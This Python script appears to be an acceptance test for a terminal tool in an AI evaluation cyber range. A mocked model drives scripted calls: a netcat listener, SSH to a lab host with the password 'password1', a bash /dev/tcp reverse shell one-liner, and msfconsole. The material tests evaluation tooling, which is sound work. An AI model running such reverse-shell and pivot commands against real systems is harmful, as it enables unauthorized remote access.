"""terminal-tool-v1 live acceptance: the tool against a built dmz_pivot range through the real provider.

A mockllm script drives the real tool-call path (so tool events carry views): open a listener session, ssh interactively to web (password prompt answered through the session), launch a connect-back, drive the caught reverse shell from the listener session, confirm the shell-only refusal inside it, run msfconsole in a third session, close everything. Afterward the script asserts the transcript, views, casts, and the sealed `terminal/<session>` evidence streams.

Run from the repo root: `uv run python design/spikes/terminal-tool/accept.py`. Needs the built dmz-pivot range in the local caches (it is) and prints PASS/FAIL per check, exiting nonzero on any FAIL.
"""

import json
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from inspect_ai import Task
from inspect_ai import eval as inspect_eval
from inspect_ai.dataset import Sample
from inspect_ai.log import EvalLog
from inspect_ai.model import ModelOutput, get_model
from inspect_ai.solver import generate, use_tools
from inspect_ranges import terminal

SPIKE = Path(__file__).parent
ROOT = SPIKE.parent.parent.parent
RANGE = ROOT / "src" / "inspect_ranges" / "examples" / "_dmz_pivot"

CHECKS: list[tuple[bool, str]] = []


def check(ok: bool, label: str) -> None:
    CHECKS.append((ok, label))
    print(f"{'PASS ' if ok else 'FAIL '} {label}", flush=True)


# the scripted agent: every entry is one real tool call through execute_tools
CALLS: list[dict[str, Any]] = [
    {"action": "open", "session": "listener"},
    {
        "action": "send",
        "session": "listener",
        "keystrokes": "nc -lvnp 4444\n",
        "duration": 1,
    },
    {"action": "open", "session": "pivot"},
    {
        "action": "send",
        "session": "pivot",
        "keystrokes": "ssh -o StrictHostKeyChecking=no deploy@10.80.10.10\n",
        "duration": 5,
    },
    {"action": "send", "session": "pivot", "keystrokes": "password1\n", "duration": 4},
    {
        "action": "send",
        "session": "pivot",
        "keystrokes": "setsid bash -c 'bash -i >& /dev/tcp/10.80.10.2/4444 0>&1' < /dev/null &\n",
        "duration": 4,
    },
    {
        "action": "send",
        "session": "listener",
        "keystrokes": "id && hostname && echo rs-$((40+2))\n",
        "duration": 4,
    },
    {
        "action": "send",
        "session": "listener",
        "keystrokes": "echo never-runs\n",
        "block": True,
    },
    {"action": "open", "session": "msf"},
    {
        "action": "send",
        "session": "msf",
        "keystrokes": "msfconsole -q -x 'version; exit'\n",
        "duration": 20,
    },
    {"action": "send", "session": "msf", "keystrokes": "", "duration": 25},
    {"action": "send", "session": "msf", "keystrokes": "", "duration": 25},
    {"action": "read", "session": "msf"},
    {"action": "close", "session": "listener"},
    {"action": "close", "session": "pivot"},
    {"action": "close", "session": "msf"},
]


def run_eval() -> EvalLog:
    outputs = [
        ModelOutput.for_tool_call("mockllm/model", "terminal", arguments)
        for arguments in CALLS
    ]
    outputs.append(ModelOutput.from_content("mockllm/model", "acceptance complete"))
    model = get_model("mockllm/model", custom_outputs=outputs)
    task = Task(
        dataset=[Sample(input="terminal tool acceptance")],
        solver=[use_tools(terminal()), generate()],
        sandbox=("range", str(RANGE / "range.yaml")),
    )
    started = time.monotonic()
    logs = inspect_eval(
        task,
        model=model,
        log_dir=str(SPIKE / "tmp" / "logs"),
        max_samples=1,
        fail_on_error=False,
    )
    print(f"eval wall time {time.monotonic() - started:.1f}s", flush=True)
    return logs[0]


def main() -> int:
    log = run_eval()
    check(log.status == "success", f"eval completed (status {log.status})")
    sample = (log.samples or [None])[0]
    if sample is None:
        return 1
    check(sample.error is None, f"sample ran clean (error: {sample.error})")

    # tool results, in call order
    results: list[str] = []
    views: list[str] = []
    for event in sample.events or []:
        if getattr(event, "event", "") == "tool":
            result = getattr(event, "result", "")
            results.append(result if isinstance(result, str) else str(result))
            view = getattr(event, "view", None)
            if view is not None:
                views.append(getattr(view, "content", "") or "")
    check(
        len(results) == len(CALLS),
        f"all {len(CALLS)} tool calls ran (got {len(results)})",
    )
    joined = "\n===\n".join(results)
    check("Opened session 'listener'" in joined, "listener session opened")
    check(
        "deploy@" in joined or "password" in joined.lower(),
        "ssh reached its password prompt interactively",
    )
    check(
        "rs-42" in joined,
        "the caught reverse shell executed a command (rs-42 came back)",
    )
    check("uid=" in joined, "the caught shell reported its identity")
    check(
        "Refusing block=True" in joined and "'nc'" in joined,
        "blocking send refused inside the caught shell, nc named",
    )
    check(
        "Framework" in joined,
        "msfconsole ran in its own session and reported its version",
    )
    check(
        any("screen at call time" in view for view in views),
        "tool views carry the decision-time screen snapshot",
    )

    # casts and evidence
    evidence_dirs = sorted((SPIKE / "tmp" / "logs").glob("*.evidence/*"))
    check(bool(evidence_dirs), "an evidence directory exists beside the log")
    if evidence_dirs:
        evidence = evidence_dirs[0]
        casts = sorted(path.name for path in evidence.glob("terminal-*.cast"))
        check(len(casts) >= 3, f"casts written for the three sessions (got {casts})")
        first = next(iter(evidence.glob("terminal-listener*.cast")), None)
        if first is not None:
            header = json.loads(first.read_text().split("\n", 1)[0])
            check(header.get("version") == 2, "the listener cast is asciicast v2")
        verify = subprocess.run(
            [
                str(ROOT / ".venv" / "bin" / "inspect-ranges"),
                "evidence",
                "verify",
                str(evidence),
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        output = verify.stdout + verify.stderr
        check(verify.returncode == 0, "evidence verify replays and seals")
        check(
            "terminal/listener" in output,
            "the terminal/listener stream is in the sealed record",
        )

    failed = sum(1 for ok, _ in CHECKS if not ok)
    print(f"\n{len(CHECKS) - failed} passed, {failed} failed (terminal acceptance)")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
